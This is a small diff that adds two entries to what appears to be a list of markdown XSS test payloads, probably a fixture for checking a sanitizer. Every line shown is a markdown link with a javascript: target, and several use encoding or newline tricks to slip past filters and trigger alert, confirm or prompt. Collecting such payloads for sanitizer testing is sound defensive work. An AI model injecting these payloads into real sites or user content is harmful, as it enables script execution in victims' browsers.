@@ -36,6 +36,8 @@ hello [hack](javascript:javascript:alert('xss'))
 [XSS](Javas%26%2399;ript:alert(1&#41;)
 
 
+[XSS](javascript:confirm(1)
+[XSS](javascript://www.google.com%0Aprompt(1))
 
 [XSS](javascript://%0d%0aconfirm(1);com)
 [XSS](javascript:window.onerror=confirm;throw%201)
